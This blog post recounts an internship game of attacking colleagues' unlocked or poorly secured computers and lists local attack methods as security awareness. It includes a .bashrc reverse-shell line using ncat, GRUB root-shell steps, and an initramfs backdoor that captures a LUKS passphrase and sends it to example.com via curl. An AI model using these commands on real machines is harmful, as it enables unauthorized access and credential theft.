---
layout: post
title: French Croissant - or why you need to lock your computer
---

Last year the first day of my internship I was given a computer and asked to install and secure it for two days. After that delay anyone can try to attack and compromise my machine, and if so I was welcome to buy some "French Croissants" to the team while the attacker explain his method to get access into your computer the next morning.
There are some techniques you need to be aware of when you're securing your machine, the list below is not exhaustive.

## Open session
When your colleague leave their computer without locking their session, it's time to go on their laptop and interact with it. In this scenario you can :
  - send an email to the team if he was logged into his mail account
  {% highlight plain%}
  To: team@company.com
  Subject: Croissant for all tomorrow
  {% endhighlight %}

  - if he was using Linux, you may want to keep a simple backdoor in order to do a privilege escalation and become a root user, the easiest way to achieve is to backdoor the .bashrc with a reverse-shell
  {% highlight bash%}
  ncat 192.168.1.2 4444 -e /bin/bash 2> /dev/null &
  {% endhighlight %}

## Written password
Maybe the most unskilled scenario, sometimes the user will write some interesting informations onto a paper sheet or a post-it, and leave it on their desktop. You can just grab the credential.    
![alt text]({{ site.baseurl }}/images/security-password-postit.jpg "Logo Title Text 1")

## Outdated components
The computer has to be updated, if your colleague doesn't do the regular patches you might be able to take advantages of this. Commonly you can target the Operating system e.g:Windows XP with MS08-067, or the Browser (Chrome/Firefox etc)

## Guest account
Sometimes the guest account is enable and allows you to get further access into the machine.
[LightDM (Ubuntu 16.04/16.10) - Guest Account Local Privilege Escalation](https://www.exploit-db.com/exploits/41923/)

## Debug components
Most of the times you can acces the debug application on the port 80 on the internal network if there is no filtering. Depending of the application you look for :
  - Common vulnerabilites (OWASP top 10)
  - Debug interface (Python Flask)

## USB Live ISO
When there is no bios password, it's easy to compromise the computer by booting with a Live USB / Live CD and adding the backdoor.

## Grub - root access
Even if there is a bios password you still need to secure your Grub (boot-manager), otherwise anyone can edit it in order to start a root shell.

{% highlight bash%}
Press [SHIFT KEY] to get into grub2
Press [E] to edit the command line
Append init=/bin/sh
{% endhighlight %}


## Encrypted Hard Drive
Mounting boot partition (not encrypted)
{% highlight bash%}
fdisk -l /dev/sda
mkdir /mnt/sda1
mount /dev/sda1 /mnt/sda1
{% endhighlight %}

Extracting initramfs-linux
{% highlight bash%}
cp /dev/sda1/initramfs-linux.img /tmp/initramfs-linux.img.gz
gunzip initramfs-linux.img.gz
cpio -i < initramfs-linux.img
{% endhighlight %}


Adding the backdoor and packaging back to a .img
{% highlight bash%}
vim /hooks/encrypt

backdoor line 78
echo -n "Enter passphrase for /dev/sda3: "
read -s mypass
echo -n $mypass | cryptsetup open --key-file - --type luks /dev/sda3 mymap
mkdir myfolder
mount /dev/mapper/mymap myfolder
echo "curl example.com/LUKS/$mypass 2> /dev/null" >> myfolder/home/user/.bashrc
echo "curl example.com/LUKS/$mypass 2> /dev/null" >> myfolder/home/root/.bashrc
umount myfolder
rmdir myfolder
cryptsetup close mymap


find . | cpio -o -H newc | gzip > ../test.img  
{% endhighlight %}
